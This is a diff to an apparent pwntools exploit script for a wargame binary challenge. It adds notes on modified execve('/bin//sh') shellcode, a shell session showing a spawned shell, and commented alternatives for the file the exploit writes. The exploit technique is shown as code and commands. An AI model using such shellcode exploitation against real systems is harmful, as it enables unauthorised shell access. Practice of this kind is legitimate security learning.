@@ -182,6 +182,13 @@ correct:    execve("/bin//sh", ["/bin//sh", 0], 0)
 incorrect:  execve("/bin//sh", ["/bin//sh", xxxx], 0)
 modify:     execve("/bin//sh", ["/bin//sh", "sh"], 0)       # "sh" stands for "shell prompt"
 
+bc7@qemu:$ cat test
+/bin/sh; sh; 0
+bc7@qemu:$ /bin/sh test
+$ whoami
+bc7
+$
+
 '''
 from pwn import *
 
@@ -194,6 +201,8 @@ p.recvuntil("Can't open ")
 filename = p.recvline().strip("\n")
 with open(filename, "w") as f:
     f.write("sh\n")
+    # f.write("0\n")
+    # f.write("/bin//sh\n")
 p.kill()
 # Second execution
 p = process("/home/fix/fix")
